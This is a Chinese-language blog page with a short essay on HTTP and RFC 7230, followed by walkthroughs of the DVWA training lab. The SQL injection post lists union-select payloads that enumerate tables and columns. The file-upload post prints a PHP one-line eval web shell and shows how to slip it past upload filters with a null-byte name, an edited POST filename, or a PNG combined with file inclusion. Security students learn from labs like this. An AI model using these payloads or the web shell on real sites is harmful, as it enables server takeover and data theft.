<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">






<link rel="stylesheet" href="/css/main.css?v=7.2.0">






<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">








<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    search: {
      root: '/',
      path: ''
    },
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    }
  };
</script>

  <meta property="og:type" content="website">
<meta property="og:title" content="楚河">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="楚河">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="楚河">





  
  
  <link rel="canonical" href="http://yoursite.com/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  
  <title>楚河</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">楚河</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
        

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/http简介/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="楚河">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/27/http简介/" class="post-title-link" itemprop="url">http简介</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-07-27 16:45:57 / Modified: 16:46:39" itemprop="dateCreated datePublished" datetime="2019-07-27T16:45:57+08:00">2019-07-27</time>
            </span>
          

          
            

            
          

          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这是一系列文章的开始，工作了这么久，发现很多人对http和web有不少的误解。当大家都在追求web交互的更快，使用webGL来充实内容，使用各类hybrid框架来实现一统所有平台的意愿，却很少有人去深刻理解http的诞生、成长。</p>
<p>从90年代开始，http作为web的附庸而逐渐成长，这么多年过去了，http的应用领域已经不仅仅局限在web，各种http的变体充斥在各个角落，在这个技术快速迭代的年代，就越需要理解技术的本质。每个技术从业者应该多问以下问题：</p>
<ul>
<li>我用的技术会死去吗</li>
<li>更好的技术是什么</li>
</ul>
<p>放在web领域，也应该问下自己：</p>
<ul>
<li>web和http会死去吗</li>
<li>他们的替代品将是什么</li>
</ul>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在1999年的<a href="https://tools.ietf.org/html/rfc2616" target="_blank" rel="noopener">RFC 2616</a>是这样描述http的设计目的：</p>
<blockquote>
<p> HTTP has been in use by the World-Wide Web global information initiative since 1990.</p>
</blockquote>
<p>http从诞生之初，就已经与万维网有不可割舍的血缘关系。因为当时万维网的特性，形成了我们耳熟能详的特性</p>
<ul>
<li>请求简单</li>
<li>传输数据灵活</li>
<li>无连接</li>
<li>无状态</li>
</ul>
<p>近二十年来，HTTP/1.1标准的内涵不挺的外延，甚至需要6个RFC来描述整个HTTP协议，他们是：</p>
<ul>
<li><p>消息-“Message Syntax and Routing” (RFC 7230)</p>
<ul>
<li><p>语义-“Semantics and Content” [RFC7231]</p>
</li>
<li><p>条件请求-“Conditional Requests” [RFC7232]</p>
</li>
<li><p>范围请求-“Range Requests” [RFC7233]</p>
</li>
<li><p>缓存-“Caching” [RFC7234]</p>
</li>
<li><p>认证-“Authentication” [RFC7235]</p>
</li>
</ul>
</li>
</ul>
<p>虽然当前来说，<code>http 2.0</code>已经蓬勃兴起， google的<code>QUIC</code>（笑称http 3.0)也在实验阶段，他们可能在安全、传输等方面有较大的优化，但是他们并没有给http赋予新的内涵：</p>
<blockquote>
<p>HTTP is a generic interface protocol for information systems.  It is designed to hide the details of how a service is implemented by presenting a uniform interface to clients that is independent of the types of resources provided. <a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a></p>
</blockquote>
<p>HTTP是一种通用的信息传递协议。对http来讲，Web世界将只是很少的一部分。</p>
<h2 id="从RFC7230开始"><a href="#从RFC7230开始" class="headerlink" title="从RFC7230开始"></a>从RFC7230开始</h2><p>先从几个问题开始：</p>
<ol>
<li><p>什么决定了服务端和客户端</p>
</li>
<li><p>为什么必须要使用空行隔开<code>header</code>和<code>body</code></p>
</li>
<li><p>URI是什么？</p>
</li>
</ol>
<p>实际上，这篇RFC解决了七十多个问题，每一个问题都可以写一篇较长的文章来讲，这里分析一下这三个问题：</p>
<h3 id="message格式决定服务端和客户端"><a href="#message格式决定服务端和客户端" class="headerlink" title="message格式决定服务端和客户端"></a>message格式决定服务端和客户端</h3><p>标准规定，如果<code>端</code>发出的是 <code>response</code>格式的消息，那么就属于<code>server</code>，反之，就是<code>client</code>。</p>
<p>事实上，完全可以由tcp特性来决定服务端还是客户端问题。但是标准如此规定，就是因为http标准并不依赖TCP来实现。</p>
<p>比较常见的是<code>google</code>使用的<code>QUIC</code>就是基于<code>UDP</code>实现的HTTP标准（有一定差异）。当然，也可以使用其它的协议来实现一个<code>http</code>协议。这类需求一般见于工业界，也可以用于物联网。</p>
<p>因此，思考HTTP的时候，希望可以脱离那句话来想象：</p>
<p><code>HTTP是基于TCP的应用层协议</code></p>
<h4 id="自定义消息头"><a href="#自定义消息头" class="headerlink" title="自定义消息头"></a>自定义消息头</h4><p>常见的请求如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)</span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">body</span><br></pre></td></tr></table></figure>

<p>常见回复如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;Hello World&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><code>header</code>和<code>body</code>中间存在一个<code>empty line</code>。这是因为，标准允许服务端或者客户端自定义消息头，为了区分<code>header</code>和<code>body</code>，标准通过设置空行来进行区分。在某些需求下，你可以将内容写在<code>header</code>区域，防止<code>body</code>内内容被防火墙或者杀毒软件干掉。</p>
<p>为什么不设置固定的<code>header</code>或者<code>body</code>？</p>
<p>http在设计之初，就用于传输各种<code>多媒体信息</code>，因此从一开始，<code>header</code>和<code>body</code>的内容就没办法进行固定。从目前来看，HTTP承载最多的也是各种信息资源的传递。所以，在这个角度：</p>
<p><code>http传输某种资源不会是最优的方案，但是一定可以传输任意资源</code></p>
<h3 id="HTTP灵魂：-资源定位"><a href="#HTTP灵魂：-资源定位" class="headerlink" title="HTTP灵魂： 资源定位"></a>HTTP灵魂： 资源定位</h3><p>HTTP发明者<code>Tim Berners-Lee</code>有句名言：</p>
<blockquote>
<p> Web users ultimately want to get at data quickly and easily. They don’t care as much about attractive sites and pretty design.</p>
</blockquote>
<p>对于创始人来说：更快的获取数据是web的唯一使命。</p>
<p>使用URI来描述资源，就是能够简化获取资源的步骤。</p>
<p>那么，URI的结构是什么？URI将永远不变吗？</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>

    
        

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/28/DVWA(五）SQL Injection/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="楚河">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/06/28/DVWA(五）SQL Injection/" class="post-title-link" itemprop="url">DVWA（五）SQL Injection</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-06-28 12:00:00" itemprop="dateCreated datePublished" datetime="2019-06-28T12:00:00+08:00">2019-06-28</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-27 17:29:53" itemprop="dateModified" datetime="2019-07-27T17:29:53+08:00">2019-07-27</time>
              </span>
            
          

          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092348.png" alt="1553822085578"></p>
<ul>
<li><p>判断是否有注入</p>
<p><code>1&#39; or &#39;12&#39;=&#39;12</code></p>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092351.png" alt="1553822179218"></p>
</li>
<li><p>注入成功后，猜字段数</p>
<ul>
<li><code>1′ or 1=1 order by 1 #</code></li>
<li><code>1′ or 1=1 order by 2 #</code></li>
<li><code>1′ or 1=1 order by 3 #</code></li>
</ul>
<p><code>order by 3</code>执行失败，说明这个查询语句只查了两个字段。</p>
</li>
<li><p>获取当前数据库</p>
<ul>
<li>1′ union select 1,database() #</li>
</ul>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092357.png" alt="1553822400568"></p>
</li>
<li><p>获取数据库中的表</p>
<ul>
<li><code>1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></li>
</ul>
</li>
<li><p>获取表中字段名</p>
<ul>
<li><code>1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #</code></li>
</ul>
</li>
</ul>
<h3 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Display values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>mysql_real_escape_string</code>会对特殊字符进行转义，但是dvwa存在 <code>数字型注入</code>， 上述做法依然可以注入。（去掉单引号）</p>
<h3 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h3><ul>
<li>增加了跳转页面，防止sqlmap注入。手工难度与 <code>low</code>级别相似</li>
</ul>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>

    
        

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/27/DVWA（四）文件上传/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="楚河">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/06/27/DVWA（四）文件上传/" class="post-title-link" itemprop="url">DVWA（四）文件上传漏洞</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-06-27 12:00:00" itemprop="dateCreated datePublished" datetime="2019-06-27T12:00:00+08:00">2019-06-27</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-27 17:30:45" itemprop="dateModified" datetime="2019-07-27T17:30:45+08:00">2019-07-27</time>
              </span>
            
          

          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><code>hack.php</code>内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'apple'</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><h4 id="直接上传执行命令"><a href="#直接上传执行命令" class="headerlink" title="直接上传执行命令"></a>直接上传执行命令</h4><p>直接将 <code>hack.php</code>上传到服务器上。发现服务器提供了文件目录路径。</p>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092319.png" alt="1553765149089"></p>
<p>打开 <code>nodejs</code>版本的菜刀。新建连接：</p>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092323.png" alt="1553765215743"></p>
<p>其中的参数：</p>
<ul>
<li><code>Shell url</code> 是上传的php文件所在位置</li>
<li><code>shell pwd</code>是你<code>post</code>指定的参数，这里是 <code>apple</code></li>
</ul>
<p>完成之后，软件就自动连接到<code>php</code></p>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092326.png" alt="1553765359282"></p>
<p>菜刀的原理是利用post请求传递指令，用PHP的eval指令进行执行。（不清楚PHP为什么还会允许 <code>eval</code>指令的存在）</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? 注意，这里限定了上传类型必须是 jpg和png</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解决这样的问题主要有三种思路：</p>
<h4 id="结合文件包含漏洞"><a href="#结合文件包含漏洞" class="headerlink" title="结合文件包含漏洞"></a>结合文件包含漏洞</h4><blockquote>
<p>服务器配置中，如果 选项<code>allow_url_fopen 和 allow_url_inc</code>为开启状态，那么就容易导致任意远程代码执行，也就是说，即使你上传的是一个png后缀的文件，通过文件包含也可以进行执行。</p>
</blockquote>
<h4 id="结合命令注入"><a href="#结合命令注入" class="headerlink" title="结合命令注入"></a>结合命令注入</h4><p>在可以注入命令的情况下，也可以直接通过 <code>mv</code>命令将 <code>png</code>命名为 <code>php</code>文件</p>
<h4 id="使用截断规则"><a href="#使用截断规则" class="headerlink" title="使用截断规则"></a>使用截断规则</h4><blockquote>
<p>php有个无法理解的特性就是  <code>magic_quotes_gpc</code>选项，php如果开启这个选项，那个单双引号和反斜线均会加上转义符号，但是这个选项必须人工进行配置，在大多数场景中这个选项都没有开启。因此可以使用特殊字符来绕开上传限制。</p>
</blockquote>
<p>php 在 5.3.4版本以下可以使用<code>%00</code></p>
<p>上传文件修改为 <code>hack.php%00.png</code> 即可。</p>
<p>从源码角度理解(省略较多内容）：</p>
<blockquote>
<p>php底层采用zendparser作为 <code>AST</code>引擎， 调用<code>lex_scan</code>去处理文件名。而这个lex_scan会忽略<code>\00</code>以后的内容。在之后的版本上，PHP已经修复了这个漏洞。</p>
</blockquote>
<h4 id="理解HTTP，改变POST-filename的值"><a href="#理解HTTP，改变POST-filename的值" class="headerlink" title="理解HTTP，改变POST filename的值"></a>理解HTTP，改变POST <code>filename</code>的值</h4><ol>
<li><p>打开浏览器界面。上传一个 <code>hack.png</code>文件</p>
<p><img src="assets/1553777412566.png" alt="1553777412566"></p>
</li>
<li><p>然后修改<code>post</code>信息</p>
</li>
</ol>
<p><img src="assets/1553777658509.png" alt="1553777658509"></p>
<p>​    将<code>hack2.png</code>改为 <code>hack2.php</code>。然后上传就会发现，成功上传了 <code>hack2.php</code></p>
<p><img src="assets/1553777822822.png" alt="1553777822822"></p>
<p>​        </p>
<blockquote>
<p>这种方法之所以能够成功。因为服务器根据<a href="https://tools.ietf.org/html/rfc6266" target="_blank" rel="noopener">RFC6266</a>的标准，会默认将文件名字与 <code>Content-Disposition</code>中的 <code>filename</code>字段内容相对应。而这里仅仅只判断了 <code>content-type</code>。</p>
<p>在大多数场景下，web应用应该给上传文件一个随机的名字，并在保存后判断其类型。</p>
</blockquote>
<h3 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h3><h4 id="代码写入PNG，和文件包含漏洞一起使用"><a href="#代码写入PNG，和文件包含漏洞一起使用" class="headerlink" title="代码写入PNG，和文件包含漏洞一起使用"></a>代码写入PNG，和文件包含漏洞一起使用</h4><p>高级别安全中，php除了判断文件后缀名是 <code>jpg</code> <code>jpeg</code> <code>png</code>之外，还要判断文件是否含有 <code>图像文件</code>的元数据信息（长、宽）。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">       ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">       getimagesize( $uploaded_tmp ) )</span><br></pre></td></tr></table></figure>

<p>这里必须满足一个前提条件：</p>
<ol>
<li>存在文件包含漏洞。即选项<code>allow_url_fopen 和 allow_url_inc</code>为开启状态。</li>
</ol>
<p>伪造一个包含php文件的<code>png</code>文件</p>
<ul>
<li><p>（linux系统）用文本方式打开一个 正常<code>png</code>文件</p>
</li>
<li><p>将一句话木马信息写入文件任意位置</p>
</li>
</ul>
<p><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092334.png" alt="1553779727483"></p>
<ul>
<li>利用 <code>文件包含</code>漏洞打开 <code>png</code>位置</li>
<li><img src="https://public-oss-ipic.oss-cn-shenzhen.aliyuncs.com/2019-07-27-092338.png" alt="1553780190594"></li>
</ul>
<blockquote>
<p> 如图，这里通过file打开，response实际上是把文件内容加到正常的payload之上进行返回。也就是<code>Content-Disposition</code>设置为 <code>inline</code>的效果。</p>
</blockquote>
<p>接着，将这个路径放入<code>菜刀</code>， 完成控制。</p>
<h2 id="参考-amp-引用"><a href="#参考-amp-引用" class="headerlink" title="参考 &amp; 引用"></a>参考 &amp; 引用</h2><p><a href="https://blog.csdn.net/zhangzhuangtongxue/article/details/78198191" target="_blank" rel="noopener">截断规则漏洞源码分析</a></p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>

    
        

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/26/DVWA（三）文件包含/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="楚河">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
